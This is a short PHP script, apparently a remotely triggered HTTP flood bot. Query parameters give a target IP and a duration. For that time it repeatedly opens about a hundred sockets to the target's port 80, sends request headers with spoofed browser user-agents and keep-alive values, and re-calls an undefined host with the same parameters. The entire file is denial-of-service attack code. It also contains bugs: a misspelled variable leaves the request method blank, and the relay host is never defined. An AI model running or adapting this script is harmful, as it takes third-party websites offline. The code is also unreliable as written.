<?
if(isset($_GET['http'])){
    $timei = time();
    $server = $_GET['ip'];
    $time = $_GET['time'];
    $req =  array('POST','GET','HEAD');
    $brow = array("", "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2", "Opera/9.80 (Windows NT 5.2; U; en) Presto/2.10.289 Version/12.00", "Opera/9.21 (Windows NT 5.1; U; en)", "Opera/9.80 (Windows NT 5.1; U; Distribution 00; ru) Presto/2.10.289 Version/12.00");
    $rand_keys = array_rand($brow, 2);
    while ((time() - $timei < $time)) {
    	foreach ($req as $mthd) {
    	    $ch = @curl_init();
            @curl_setopt($ch, CURLOPT_URL,  $myhost."?http&ip=$server&time=$time");
            @curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            @curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);
            @curl_setopt($ch, CURLOPT_HEADER, 0);
            @curl_setopt($ch, CURLOPT_RETURNTRANSFER, 0);
            @curl_setopt($ch, CURLOPT_TIMEOUT, 5);
            @curl_exec($ch);
    	    $fs      = array();
            $request =  "$mhtd / HTTP/1.1\r\n";
            $request .= "Host: $server\r\n";
            $request .= "User-Agent: ".$brow[$rand_keys[1]]."\r\n";
            $request .= "Keep-Alive: 900\r\n";
            $request .= "Accept: *.*\r\n";
            for ($i = 0; $i < 100; $i++) {
            	$fs[$i] = @fsockopen($server, 80, $errno, $errstr);
            }
            for ($i = 0; $i < 100; $i++) {
            	if (@fwrite($fs[$i], $request)) {
            		continue;
            	} else {
            		$fs[$i] = @fsockopen($server, 80, $errno, $errstr);
            	}
            } 	
        }
    }
}
?>
